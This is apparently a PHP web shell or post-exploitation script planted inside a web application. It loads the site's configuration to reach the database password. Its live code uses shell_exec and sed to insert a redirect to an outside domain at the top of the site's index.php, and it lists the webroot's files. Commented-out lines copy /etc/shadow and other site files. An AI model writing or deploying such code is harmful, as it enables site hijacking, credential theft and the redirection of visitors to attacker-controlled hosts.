<?php 
   //------------- GET SQL PASS
   include "../../../../config/config.php";
   $string = '<?php header("Location: https://yyyyyyy.info/"); ?>';
   //echo $mysqlPassword;

   //---- READ A FILE
   //copy('../../../../modules/profile/profile.php', './newuser.txt');
   //echo readfile("../../../../index.php");
   
   //--- COPY FILE
   //copy('/etc/shadow', './shadow.txt');

   // ---- Execute commands
   echo shell_exec("sed -i '1s/^/".$string." /' ../../../../index.php > ../../../../test");

   echo readfile("../../../../test");
   //------ Get names of files 
   $path    = '../../../../';
   $files = scandir($path);
   $files = array_diff(scandir($path), array('.', '..'));
   foreach($files as $file){
   echo "<a href='$file'>$file</a>\n";
   }

//$fileContent = file_get_contents (".../../../../index.php");
//file_put_contents (".../../../../index.php", $string . "\n" . $fileContent);
//echo readfile("../../../../index.php");
?>
